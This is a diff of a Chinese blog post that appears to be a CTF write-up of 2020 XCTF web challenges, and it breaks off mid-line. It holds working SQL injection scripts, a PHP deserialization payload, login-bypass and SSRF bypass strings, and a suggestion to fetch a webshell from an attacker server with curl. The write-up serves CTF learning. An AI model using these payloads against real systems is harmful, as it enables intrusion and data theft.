@@ -468,65 +468,272 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><p>这道题基本算是完整做出来了。只是考点有点坑。都知道有注入但是就是难找。<br>实际上在注册页面有注释提醒type参数110时会不一样。并且之前登陆进去页面中有出题人提示的”注册账户也有等级之分”，所以可以在注册时就将type调为110。登陆进去就可以在search.php进行注入了。<br>(但是这个区分点就很无语，没啥含金量，偏偏又能难倒一堆人)</p>
 <p>进去后一个普通的盲注了。只不过过滤了关键字置为空，可以双写绕过。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">'http://121.37.179.47:1001/regist.php'</span></span><br><span class="line">url2=<span class="string">'http://121.37.179.47:1001/login.php'</span></span><br><span class="line">url3=<span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'email'</span>: <span class="string">'byc_409'</span>, <span class="string">'pass'</span>: <span class="string">'123'</span>, <span class="string">'repass'</span>: <span class="string">'123'</span>, <span class="string">'type'</span>: <span class="string">'110'</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        s.post(url2, data=&#123;<span class="string">'email'</span>: <span class="string">'byc_409'</span>, <span class="string">'pass'</span>: <span class="string">'123'</span>&#125;)<span class="comment">#admin,fl4g,jd,user</span></span><br><span class="line">        payload = <span class="string">"1' or ascii(substr((selselectect group_concat(flag) frfromom fl4g),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">        r = s.post(url3, data=&#123;<span class="string">'flag'</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'no'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+
+s=requests.session()
+url=&#39;http://121.37.179.47:1001/regist.php&#39;
+url2=&#39;http://121.37.179.47:1001/login.php&#39;
+url3=&#39;http://121.37.179.47:1001/search.php&#39;
+flag=&#39;&#39;
+s.post(url, data={&#39;email&#39;: &#39;byc_409&#39;, &#39;pass&#39;: &#39;123&#39;, &#39;repass&#39;: &#39;123&#39;, &#39;type&#39;: &#39;110&#39;})
+for i in range(1,50):
+    print(i)
+    a=0
+    for j in range(32,128):
+        s.post(url2, data={&#39;email&#39;: &#39;byc_409&#39;, &#39;pass&#39;: &#39;123&#39;})#admin,fl4g,jd,user
+        payload = &quot;1&#39; or ascii(substr((selselectect group_concat(flag) frfromom fl4g),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;#&quot;
+        r = s.post(url3, data={&#39;flag&#39;: payload})
+        if &#39;no&#39; not in r.text:
+            flag+=chr(j)
+            print(flag)
+            a=1
+            break
+    if a==0:
+        break</code></pre>
 <p>注出来只能得到账号密码(md5)，加上一个只有一部分的flag。只能继续进后台了。由于之前扫目录得到过admin.html。直接登录，发现是个扫描器<img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="sql"><br>由于我前几天才接受的校队考核就是mysql load data infile的知识点，加上跑出来的flag是mysql-rogue-server，马上就能想到使用Mysql-Rogue-Server解决。解决方法很简单就是在服务器跑脚本就完了，但其实原理挺麻烦的。简单解释就是我们利用 load data infile的特性，可以用脚本伪造mysql传输数据包。只要这样就能返回服务器上的任意文件读取。<br>不过这题python脚本不大行的样子，用php脚本解决问题，读<code>flag.php</code>就得到剩下的flag。</p>
 <h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><p>这题基本没啥技术难度，主要就是跑脚本了。本来随便测测的，发现禁用系统函数以及一个open_basedir。那就看下目录吧，发现突然多了好多php文件，给师傅看看发现就是上次公益赛easy_thinking的bypass脚本<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>那就用就完事了。直接copy函数用了后包含一下命令执行即可。<br>这题郁师傅随手做的，貌似因为搅屎原因刷了十几分钟才出来。<br>至于为什么会搅屎，随便放一下比赛时读到的别队大佬php命令<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><p>这题不想说啥了。就是坑。赛后看看Nu1l的解题脚本后，发现要用<br><code>\u\n\i\o\n \s\e\l\e\c\t</code>这种语句。所以它源码应该是直接把参数<br>time拿进函数date一把梭………..<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="date"></p>
 <p>这谁想得到，真的无语。<br>后面一个反序列化的trick,不想多说了。</p>
 <p>好吧，官方wp里发现这题出题人搭在自己服务器上，来复现一波。<br>注入不说了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">let=string.ascii_lowercase+<span class="string">"_.()"</span></span><br><span class="line">exp=<span class="string">''</span></span><br><span class="line">payload=<span class="string">"1' union select 1,(select group_concat(passwd) from admin),3#"</span><span class="comment"># /eGlhb2xldW5n</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> let:</span><br><span class="line">        ch=<span class="string">"\\"</span>+ch</span><br><span class="line">    exp+=ch</span><br><span class="line">print(exp)</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://eqwerqwrfweryu.mycute.cn/?time='</span></span><br><span class="line">r=requests.get(url+urllib.parse.quote(exp))</span><br><span class="line">page=re.findall(<span class="string">r'&lt;div class="text-c "&gt;(.*?)&lt;/div&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">print(page)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import urllib.parse
+import string
+import re
+
+let=string.ascii_lowercase+&quot;_.()&quot;
+exp=&#39;&#39;
+payload=&quot;1&#39; union select 1,(select group_concat(passwd) from admin),3#&quot;# /eGlhb2xldW5n
+for ch in payload:
+    if ch in let:
+        ch=&quot;\\&quot;+ch
+    exp+=ch
+print(exp)
+
+url=&#39;http://eqwerqwrfweryu.mycute.cn/?time=&#39;
+r=requests.get(url+urllib.parse.quote(exp))
+page=re.findall(r&#39;&lt;div class=&quot;text-c &quot;&gt;(.*?)&lt;/div&gt;&#39;,r.text)[0]
+print(page)</code></pre>
 <p>然后一个ssrf读源码，file协议加localhost直接读。估计跟hgame week2那题一模一样的后端代码。根据提示读到某个重要php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		$str = <span class="string">""</span>;</span><br><span class="line">		 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">		 	$str = $str .chr($num);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr($number);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">		  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">		  	<span class="keyword">return</span> $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+class trick{
+    public $gf;
+    public function content_to_file($content){    
+        $passwd = $_GET[&#39;pass&#39;];
+        if(preg_match(&#39;/^[a-z]+\.passwd$/m&#39;,$passwd)) 
+    { 
+
+        if(strpos($passwd,&quot;20200202&quot;)){
+            echo file_get_contents(&quot;/&quot;.$content);
+
+        }
+
+         } 
+        }
+    public function aiisc_to_chr($number){
+        if(strlen($number)&gt;2){
+        $str = &quot;&quot;;
+         $number = str_split($number,2);
+         foreach ($number as $num ) {
+             $str = $str .chr($num);
+         }
+         return strtolower($str);
+        }
+        return chr($number);
+    }
+    public function calc(){
+        $gf=$this-&gt;gf;
+        if(!preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)){
+              eval(&#39;$content=&#39;.$gf.&#39;;&#39;);
+              $content =  $this-&gt;aiisc_to_chr($content); 
+              return $content;
+        }
+    }
+    public function __destruct(){
+        $this-&gt;content_to_file($this-&gt;calc());
+
+    }
+
+}
+unserialize((base64_decode($_GET[&#39;code&#39;])));
+
+?&gt;</code></pre>
 <p>属实佩服出题人ascii码都能打错。<br>上面一层换行符绕过password的校验<br><code>a.passwd%0a20200202</code><br>下面有点像php里的构造技巧可以用取反，也可以使用复杂的字符拼接flag大写ascii码的数字。<br>exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class trick&#123;</span><br><span class="line">    public $gf;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$abc&#x3D;&quot;FLAG&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;strlen($abc);$i++)&#123;</span><br><span class="line">    echo(ord($abc[$i]));</span><br><span class="line">&#125;*&#x2F;</span><br><span class="line">#70766571</span><br><span class="line">$o&#x3D;new trick();</span><br><span class="line">$o-&gt;gf&#x3D;&#39;~&#39;.~&#39;70766571&#39;;#~\xC8\xCF\xC8\xC9\xC9\xCA\xC8\xCE</span><br><span class="line">echo(base64_encode(serialize($o)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
 
-
-
-
-<h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>一个变种的万能密码，还居然是个原题。可惜没做过。<br>语句很清晰</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br></pre></td></tr></table></figure>
+class trick{
+    public $gf;
+}
+/*
+$abc=&quot;FLAG&quot;;
+for($i=0;$i&lt;=strlen($abc);$i++){
+    echo(ord($abc[$i]));
+}*/
+#70766571
+$o=new trick();
+$o-&gt;gf=&#39;~&#39;.~&#39;70766571&#39;;#~\xC8\xCF\xC8\xC9\xC9\xCA\xC8\xCE
+echo(base64_encode(serialize($o)));
+?&gt;</code></pre><h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>一个变种的万能密码，还居然是个原题。可惜没做过。<br>语句很清晰</p>
+<pre><code class="php">$stmt = $pdo-&gt;prepare(&quot;SELECT username from users where username=&#39;${_POST[&#39;username&#39;]}&#39; and password=&#39;${_POST[&#39;password&#39;]}&#39;&quot;);</code></pre>
 <p>这次因为上面那道坑题又查了不少sql注入的资料，中间也学到了一个trick，比如此题payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&#39;-0-&#39;   or    &#39;^0^&#39;     </span><br><span class="line">acdvvadva&#39; &amp;&#39;1 #前面随便一个字符串</span><br><span class="line">都可</span><br></pre></td></tr></table></figure>
-<p>实际就是利用了mysql里字符的特性。比如万能密码<br><code>username=&#39;admin&#39;-0-&#39;&#39;</code>里mysql会把admin转为数字，因为它跟数字运算了。如果这里0换成1相当于<code>username=-1</code>，属于错误。如果换成<code>username=0</code>则直接返回所有结果。<br>同理，这个思路可以带到异或。进一步还可以用在某些过滤较多的盲注下，比如过滤了注释符号时的布尔盲注：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39;-(1&#x3D;1)-&#39;    布尔值假</span><br><span class="line">payload&#x3D;&#39;-(1&#x3D;0)-&#39;    布尔值真</span><br><span class="line">...</span><br><span class="line">payload&#x3D;&#39;-(length(database())&#x3D;12)-&#39;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>最早做的一道题。其实思路蛮清晰的，但是后来没做了。其实有一部分原因是因为自己最后一步5字命令执行hitcon原题一直没做出来过。迷惑。<br>开始是审计源码，在profile.php中发现有一个session.serialize_handler序列化处理器不同的问题。所以只要把序列化数据写进session并满足他<code>this-&gt;admin=1</code>的条件即可。<br>这题提供了一个现成的可控参数。所以不需要像原来jarvisoj上做的一道题那样构造一个上传写入session.<br>进入profile后可以看到源码是hitcon原题，但是前面加了一层过滤<br>其实就是经典的<code>filtervar+pregmatch</code><br>之前曾经整理过ssrf的经典waf：<a href="https://www.jianshu.com/p/095f233cc9d5" target="_blank" rel="noopener">https://www.jianshu.com/p/095f233cc9d5</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code>admin
+&#39;-0-&#39;   or    &#39;^0^&#39;     
+acdvvadva&#39; &amp;&#39;1 #前面随便一个字符串
+都可</code></pre><p>实际就是利用了mysql里字符的特性。比如万能密码<br><code>username=&#39;admin&#39;-0-&#39;&#39;</code>里mysql会把admin转为数字，因为它跟数字运算了。如果这里0换成1相当于<code>username=-1</code>，属于错误。如果换成<code>username=0</code>则直接返回所有结果。<br>同理，这个思路可以带到异或。进一步还可以用在某些过滤较多的盲注下，比如过滤了注释符号时的布尔盲注：</p>
+<pre><code>payload=&#39;-(1=1)-&#39;    布尔值假
+payload=&#39;-(1=0)-&#39;    布尔值真
+...
+payload=&#39;-(length(database())=12)-&#39;    </code></pre><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>最早做的一道题。其实思路蛮清晰的，但是后来没做了。其实有一部分原因是因为自己最后一步5字命令执行hitcon原题一直没做出来过。迷惑。<br>开始是审计源码，在profile.php中发现有一个session.serialize_handler序列化处理器不同的问题。所以只要把序列化数据写进session并满足他<code>this-&gt;admin=1</code>的条件即可。<br>这题提供了一个现成的可控参数。所以不需要像原来jarvisoj上做的一道题那样构造一个上传写入session.<br>进入profile后可以看到源码是hitcon原题，但是前面加了一层过滤<br>其实就是经典的<code>filtervar+pregmatch</code><br>之前曾经整理过ssrf的经典waf：<a href="https://www.jianshu.com/p/095f233cc9d5" target="_blank" rel="noopener">https://www.jianshu.com/p/095f233cc9d5</a></p>
+<pre><code class="php">&lt;?php
+   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;
+   // check if argument is a valid URL
+   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {
+      // parse URL
+      $r = parse_url($argv[1]);
+      print_r($r);
+      // check if host ends with google.com
+      if(preg_match(&#39;/google\.com$/&#39;, $r[&#39;host&#39;])) {
+         // get page from URL
+         exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);
+         print_r($a);
+      } else {
+         echo &quot;Error: Host not allowed&quot;;
+      }
+   } else {
+      echo &quot;Error: Invalid URL&quot;;
+   }
+?&gt;</code></pre>
 <p>当时payload是<code>0://evil.com:80;google.com:80</code><br>但是此题其实跟bytectf的boringcode更像。幸好自己比赛前几天才复现过。具体细节上就是将host的google改为baidu，加了一层data协议的过滤。以及ssrf方式变为<code>file_get_contents()</code><br>注意，原本curl的时候我们是有多解的。但是ssrf换成<code>file_get_contents()</code>请求只有一种普遍的方式就是<code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</code><br>host后的内容直接以路径绕过。并且作为请求内容输出。<br>此题过滤了data，与bytectf一致。当时我看到boringcode这题很多战队解决方法是购买域名绕过对host的限制。除此之外还有说用baidu302跳转的，这里显然不行；有说用ftp协议的，我试过也不行。当时还剩下一种解决方法我试了一下发现可以，就是<code>compress.zlib://data:@baidu.com/baidu.com?,echo(scandir(&#39;.&#39;));</code>而且直接从路径获取内容比另一种方法简单许多。</p>
 <p>所以此题直接使用这一方法就能绕过校验了。<br><code>compress.zlib://data:@127.0.0.1/plain;base64,</code><br>后面hitcon的内容不多说。我觉得自己虽然orange的脚本用不出来，其他方法说不定可以。比如把里面的命令换成<code>curl vps ip &gt; a.php</code><br>写入一句话。</p>
 <h1 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h1><p>有意思的题目，就是我payload几乎都完成了结果没做出来。泪流满面。<br>开始第一天发现是个CSP,加上有个文件上传点。直接就猜是xss+cspbypass。结果试了下发现个别参数一堆过滤还有没找到xss的点。第二天才知道有git源码泄露，立马原地复活。<br>比赛时整理的要点</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.$message可控，绕过preg_match&#39;&#x2F;coo|&lt;|ja|\&amp;|\\\|&gt;|win&#x2F;i&#39;后</span><br><span class="line">addslashes后存储起来</span><br><span class="line">然后showmessage()里调用了echo &quot;&lt;body&gt;&lt;script&gt; var a &#x3D; &#39;&#123;$this-&gt;info-&gt;message&#125;&#39;;document.write(a);&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&quot;;</span><br><span class="line"></span><br><span class="line">2.$answer可控</span><br><span class="line">绕过preg_match &quot;&#x2F;[^a-zA-Z_\-&#125;&gt;@\]*]&#x2F;i&quot;跟</span><br><span class="line">&#x2F;f|sy|and|or|j|sc|in&#x2F;i</span><br><span class="line">拼接进eval(eval(&quot;\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;);)</span><br><span class="line"></span><br><span class="line">3.$referer可控</span><br><span class="line">跳转</span><br><span class="line">4.文件上传</span><br><span class="line">禁了[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;&#x3D;&#39;, &#39;co&#39;, &#39;\\&#39;, &#39;&quot;&#39;, &#39;\&#39;&#39;]</span><br></pre></td></tr></table></figure>
-<p>这里CSP写的很基本，就是个允许同源脚本，而且开放了unsafe-inline。这种给了文件上传的js就是白给。CSP轻松解决。现在关键是waf。<br>$message是传打xss的语句的。但是过了一层addslashes后被写入语句，意味着必须要解决宽字符的问题。这里如果是常规方法可以在里面再写一个<code>script</code>内容绕过。可是标签被过滤了。只能考虑其他方法。</p>
+<pre><code>1.$message可控，绕过preg_match&#39;/coo|&lt;|ja|\&amp;|\\\|&gt;|win/i&#39;后
+addslashes后存储起来
+然后showmessage()里调用了echo &quot;&lt;body&gt;&lt;script&gt; var a = &#39;{$this-&gt;info-&gt;message}&#39;;document.write(a);&lt;/script&gt;&lt;/body&gt;&quot;;
+
+2.$answer可控
+绕过preg_match &quot;/[^a-zA-Z_\-}&gt;@\]*]/i&quot;跟
+/f|sy|and|or|j|sc|in/i
+拼接进eval(eval(&quot;\$this-&gt;&quot;.$answer.&quot; = false;&quot;);)
+
+3.$referer可控
+跳转
+4.文件上传
+禁了[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;=&#39;, &#39;co&#39;, &#39;\\&#39;, &#39;&quot;&#39;, &#39;\&#39;&#39;]</code></pre><p>这里CSP写的很基本，就是个允许同源脚本，而且开放了unsafe-inline。这种给了文件上传的js就是白给。CSP轻松解决。现在关键是waf。<br>$message是传打xss的语句的。但是过了一层addslashes后被写入语句，意味着必须要解决宽字符的问题。这里如果是常规方法可以在里面再写一个<code>script</code>内容绕过。可是标签被过滤了。只能考虑其他方法。</p>
 <p>$answer应该是要利用的，最终可以实现一个eval语句，但是严格限制我们只能将某个属性置为false。</p>
 <p>lib.php可以看见一段关键函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;pre) <span class="keyword">and</span> <span 